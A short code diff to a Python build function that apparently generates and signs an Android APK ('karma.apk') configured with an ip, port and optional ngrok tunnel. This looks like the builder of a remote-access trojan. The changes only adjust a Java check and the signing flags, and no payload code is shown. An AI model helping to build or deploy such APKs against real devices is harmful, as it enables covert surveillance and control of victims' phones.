@@ -369,9 +369,9 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
         print(e)
         sys.exit()
     java_version = execute("java -version")
-    version_no = re.search(pattern, java_version.stderr).groups()[0]
-    if java_version.stderr == "":print(stdOutput("error")+"Java Not Installed");exit()
-    if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
+    if java_version.returncode: print(stdOutput("error")+"Java Not Installed");exit()
+    #version_no = re.search(pattern, java_version.stderr).groups()[0]
+    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
@@ -384,7 +384,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar "+outFileName+" --override",que],)
+        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
